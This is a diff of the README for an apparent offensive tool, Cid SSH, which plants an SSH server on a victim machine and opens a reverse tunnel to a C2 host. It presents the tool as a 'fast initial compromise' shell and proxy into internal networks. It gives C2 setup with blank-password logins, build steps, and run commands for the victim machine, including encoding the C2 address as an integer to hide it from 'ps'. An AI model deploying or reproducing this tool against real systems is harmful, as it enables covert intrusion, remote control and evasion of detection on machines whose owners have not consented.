@@ -1,11 +1,13 @@
 # Cid SSH
 ![alt text](http://equestrianstatue.org/wp-content/uploads/2016/04/Spain-Burgos-El-Cid-4-525x394.jpg)
 
-This is a statically compiled tool (no dependencies needed) that can be used to create a SSH server and as SSH client. It will firstly, spin up an SSH server (listening in `localhost` and by default in port 2222), create certificates for it and finally create a reverse SSH tunnel with the C2. Due to the SSH server listens at `localhost`, automated scanners won't be able to detect it. 
+Let's face it, there is no better shell than SSH. It just not only provides a rich encrypted shell communication but it can be used to create a socks proxy to browse the internal network of a system.
+
+**CidSSH** is a statically compiled tool (no dependencies needed) that can be used to create an SSH server and a SSH client within just one binary. It will firstly, create RSA certificates, spin up an SSH server (listening in `localhost` and by default on port 2222),and finally create a reverse SSH tunnel with a C2 host specify by command lone. Due to the fact that the SSH server listens at `localhost`, external scanners won't detect it. 
 
 This tool can be used as a fast initial compromise tool that can be used not only as a shell but also to browse the internal network of the victim. 
 
-Windows systems lack of a proper TTY but thanks to [this](https://blogs.msdn.microsoft.com/commandline/2018/08/02/windows-command-line-introducing-the-windows-pseudo-console-conpty/) we can in recent Windows versions get a fully functional TTY. In the case that the target system does not support `CreatePseudoConsole` it will downgrade to a simple and not interactive shell.
+Windows systems lack of a proper TTY but thanks to [this](https://blogs.msdn.microsoft.com/commandline/2018/08/02/windows-command-line-introducing-the-windows-pseudo-console-conpty/) we can in recent Windows versions get a fully functional TTY. In the case that the target system does not support `CreatePseudoConsole` it will downgrade to a simple, not interactive shell.
 
 ## Setup instructions
 ### C2 server
@@ -25,22 +27,19 @@ Allow blank passwords for SSH sessions of anonymous in `/etc/ssh/sshd_config`:
 Restart sshd:
 ```systemctl restart ssh```
 
-### Client
-You can just use the prebuilt binaries that are in [Release](https://github.com/illera88/Cid-SSH/releases/tag/v1.0). 
+### Prebuilt binaries
+You can just use the prebuilt binaries that are in [Release](https://github.com/illera88/Cid-SSH/releases/tag/v1.0). They are ready to roll.
 
-If you want to compile from source keep reading
+If you want to compile from source keep reading below.
 
 ### Compilation on Windows
-Compiling the client is somehow tricky because `libssh` (the library we use to handle SSH communications) does not support creating a SSH server using certificates from memory but they need to exist in disk. Since we are 3l373 hackers we don't want to drop any file to disk so I modified the `libssh` code. 
+You can use the `CMakeLists.txt` along with `CMake` to create a Visual Studio project.
 
-You can find the modified code [here](https://github.com/illera88/libssh_mod) or getting the prebuilt libraries [here](https://github.com/illera88/PrecompiledLibraries/tree/master/windows/libssh_mod)
-
-To compile it just make sure you add the includes and libraries for:
-- libssh_mod 
-- zlib
+To generate mentioned project, just make sure you set in `CMake` the proper include and library paths for:
+- libssh 
 - openssl
 
-You can find all of them already prebuilt for Windows [here](https://github.com/illera88/PrecompiledLibraries/).
+You can find both of them already statically prebuilt for Windows [here](https://github.com/illera88/PrecompiledLibraries/).
 
 ### Compilation on Linux
 CidSSH is compiled statically for linux using musl (a replacement for libc) from an Alpine distribution `x86_64`. 
@@ -64,12 +63,12 @@ make
 ```
 
 ## Using it
-It's very easy. In the attacked machine:
+It's very easy. In the victim machine:
 ```
 Cid-SSH.exe 192.168.15.135
 ```
 
-You could also specify the IP address as an integer so it's not very obvious:
+You could also specify the IP address as an integer so it's not that obvious if `ps` is run:
 ```
 Cid-SSH.exe -t 3232239495
 ```
